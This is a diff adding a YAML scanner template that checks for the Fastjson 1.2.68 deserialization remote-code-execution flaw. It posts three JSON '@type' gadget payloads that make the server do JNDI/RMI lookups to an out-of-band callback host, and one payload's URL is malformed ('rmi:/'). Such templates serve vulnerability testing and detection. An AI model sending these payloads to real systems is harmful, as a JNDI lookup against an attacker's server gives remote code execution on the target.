@@ -1,0 +1,51 @@
+id: fastjson-1-2-68-rce
+
+info:
+  name: Fastjson 1.2.68 Deserialization RCE
+  author: zh
+  severity: critical
+  reference:
+    - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
+    - https://github.com/wyzxxz/fastjson_rce_tool
+
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"org.apache.shiro.jndi.JndiObjectFactory",
+           "resourceName":"rmi://{{reverseURL}}/Exploit"
+        }
+    expression: response.status == 200 && reverse.wait(5)
+  r1:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
+           "jndiNames":"rmi://{{reverseURL}}/Exploit"
+        }
+    expression: response.status == 200 && reverse.wait(5)
+  r2:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
+           "metricRegistry":"rmi:/{{reverseURL}}/Exploit"
+        }
+    expression: response.status == 200 && reverse.wait(5)
+expression: r0() || r1() || r2()
